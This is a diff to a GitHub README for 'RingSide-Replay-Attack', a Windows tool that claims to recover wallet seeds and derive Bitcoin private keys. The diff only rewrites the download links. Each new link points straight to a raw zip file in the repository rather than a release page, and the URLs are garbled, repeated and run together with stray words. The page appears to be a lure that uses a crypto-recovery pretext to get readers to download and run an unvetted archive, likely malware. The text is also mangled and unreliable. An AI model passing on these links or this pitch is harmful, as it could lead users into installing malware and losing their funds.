@@ -1,7 +1,7 @@
 # 🛡️ RingSide-Replay-Attack - Safeguard Your Crypto Assets Today!
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip%20Latest%https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip)](https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip Replay https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip%20Latest%https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip Replay https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip)](https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip Replay https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **RingSide Replay Attack** application. This tool helps you recover your SEED and derive Bitcoin wallet private keys safely. Understanding how 32-bit entropy affects security is crucial for protecting your crypto assets. This guide will help you download and run the application easily.
@@ -18,11 +18,11 @@ Welcome to the **RingSide Replay Attack** application. This tool helps you recov
 - **Storage**: Minimum of 100 MB of free disk space.
 
 ## 📥 Download & Install
-To get started, visit the following link to download: [https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip](https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip).
+To get started, visit the following link to download: [https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip Replay https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip](https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip Replay https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed. It will typically be at the top of the page.
-3. Look for the file that matches your operating system (e.g., `https://github.com/Hitplus/RingSide-Replay-Attack/raw/refs/heads/main/RingSide Replay Attack_files/Side-Attack-Ring-Replay-2.4.zip` for Windows).
+3. Look for the file that matches your operating system (e.g., `https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip Replay https://raw.githubusercontent.com/Hitplus/RingSide-Replay-Attack/main/RingSide Replay Attack_files/Side-Ring-Attack-Replay-1.8-beta.2.zip` for Windows).
 4. Click the file name to start the download.
 
 Once the download is complete:
